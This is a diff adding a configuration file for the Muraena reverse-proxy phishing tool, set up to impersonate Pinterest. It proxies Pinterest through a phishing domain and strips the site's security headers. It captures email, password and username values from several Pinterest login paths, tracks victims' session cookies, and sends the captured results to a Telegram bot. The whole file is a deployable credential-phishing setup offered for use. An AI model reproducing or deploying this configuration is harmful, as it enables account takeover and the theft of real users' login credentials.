@@ -1,0 +1,134 @@
+#BY @WILECURITY
+# Proxy
+#
+[proxy]
+    phishing = "your-domain"
+    destination = "www.pinterest.com"
+    IP = "0.0.0.0"
+    port = 443
+
+    [proxy.HTTPtoHTTPS]
+    enable = true
+    HTTPport = 80
+
+#
+# Origins (Pinterest required domains)
+#
+[origins]
+    externalOriginPrefix = "cdn-"
+    externalOrigins = [
+        "www.pinterest.com",
+        "pinterest.com",
+        "pinimg.com",
+        "i.pinimg.com",
+        "s.pinimg.com",
+        "log.pinterest.com",
+        "api.pinterest.com"
+    ]
+
+#
+# Transform
+#
+[transform]
+    [transform.base64]
+        enable = false
+        padding = ["=", "."]
+
+    [transform.request]
+        headers = ["Cookie", "Referer", "Origin"]
+        add.headers = [
+            {name = "X-Forwarded-Host", value = "wiskon.shop"},
+            {name = "X-Forwarded-Proto", value = "https"}
+        ]
+        remove.headers = ["X-Forwarded-For"]
+
+    [transform.response]
+        skipContentType = ["font/*", "image/*"]
+        headers = ["Location", "Set-Cookie"]
+        remove.headers = [
+            "X-Frame-Options",
+            "Content-Security-Policy",
+            "Strict-Transport-Security"
+        ]
+        add.headers = [
+            {name = "X-Phishing", value = "via Muraena"}
+        ]
+
+#
+# Log
+#
+[log]
+    enable = true
+
+#
+# Redis
+#
+[redis]
+    host = "127.0.0.1"
+    port = 6379
+    password = ""
+
+#
+# TLS
+#
+[tls]
+    enable = true
+    expand = false
+    certificate = "/etc/letsencrypt/live/your-domain/fullchain.pem"
+    key = "/etc/letsencrypt/live/your-domain/privkey.pem"
+    root = "/etc/letsencrypt/live/your-domain/fullchain.pem"
+    sslKeyLog = "./config/sslkeylog.log"
+    minVersion = "TLS1.2"
+    renegotiationSupport = "Never"
+
+#
+# Tracking (Credential Capture)
+#
+[tracking]
+    enable = true
+    trackRequestCookie = true
+
+    [tracking.trace]
+        identifier = "_gat"
+        validator = "[a-zA-Z0-9]{5}"
+        header = "X-Whatveryouwant-Header"
+
+        [tracking.trace.landing]
+            type = "query"
+            header = "X-Whatveryouwant-Landing-Header"
+
+    [tracking.secrets]
+        paths = [
+            "/login",
+            "/resource/LoginResource",
+            "/resource/EmailLoginResource",
+            "/login/email/"
+        ]
+
+        [[tracking.secrets.patterns]]
+            label = "Email"
+            start = "email="
+            end = "&"
+
+        [[tracking.secrets.patterns]]
+            label = "Password"
+            start = "password="
+            end = "&"
+
+        [[tracking.secrets.patterns]]
+            label = "Username"
+            start = "username="
+            end = "&"
+
+        [[tracking.secrets.patterns]]
+            label = "Email (alternative)"
+            start = "login_email="
+            end = "&"
+
+#
+# Telegram Notifications
+#
+[telegram]
+    enable = true
+    botToken = "YOUR-TG-BOT-TOKEN"
+    chatIDs = ["YOUR-TG-CHAT-ID"]
